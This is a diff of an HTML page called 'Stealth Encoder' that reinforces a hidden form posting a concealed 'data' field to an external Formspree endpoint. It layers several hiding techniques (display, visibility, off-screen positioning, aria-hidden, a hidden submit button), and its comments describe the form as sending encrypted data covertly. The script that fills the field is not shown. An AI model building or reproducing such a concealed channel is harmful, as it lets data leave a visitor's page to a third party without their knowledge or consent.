@@ -14,18 +14,29 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
+            margin: 0;
         }
         h2 {
             color: gold;
             text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
         }
+        /* Ensure the form stays hidden */
+        #stealthForm {
+            display: none;
+            visibility: hidden;
+            position: absolute;
+            left: -9999px;
+        }
     </style>
 </head>
 <body>
+
     <h2>Stealth Encoder</h2>
-    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST" style="display: none;">
+
+    <!-- Hidden form to send encrypted data -->
+    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST" aria-hidden="true">
         <input type="hidden" name="data" id="encodedData">
-        <button type="submit">Send</button>
+        <button type="submit" style="display: none;">Send</button>
     </form>
 
     <script src="dom.js"></script>
